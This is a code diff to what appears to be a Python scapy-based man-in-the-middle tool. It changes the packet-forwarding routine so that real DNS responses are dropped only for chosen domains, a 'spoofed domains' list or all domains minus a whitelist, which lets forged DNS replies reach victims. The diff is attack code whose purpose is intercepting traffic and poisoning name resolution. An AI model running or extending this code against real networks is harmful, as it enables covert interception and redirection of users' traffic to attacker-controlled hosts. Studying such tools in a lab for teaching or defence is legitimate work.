@@ -4,7 +4,7 @@ from threading import Lock
 # Additional libraries
 from scapy import packet
 from scapy.arch import get_if_hwaddr, get_if_addr
-from scapy.layers.dns import DNS
+from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import IP
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sendp, sniff
@@ -39,14 +39,17 @@ def forward(interface: str, settings: dict):
             return
         if received_packet[IP].dst == attacker_ip:
             return
-        print('received intercepted package')
         if settings['forward'] == 'all-except':
             if DNS in received_packet:
                 if received_packet[DNS].qr == 1 and received_packet[DNS].ancount > 0:
-                    if settings['show selective forward block']:
-                        print('Did not forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[
-                            IP].dst)
-                    return
+                    target = received_packet[DNSQR].qname
+                    if (settings['spoof all domains'] and target.decode()[: -1] not in settings[
+                        'whitelist spoofed domains']) or target.decode()[: -1] in settings['spoofed domains']:
+                        if settings['show selective forward block']:
+                            print(
+                                'Did not forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[
+                                    IP].dst)
+                        return
         send_forward(received_packet)
 
     while not settings['interrupted']:
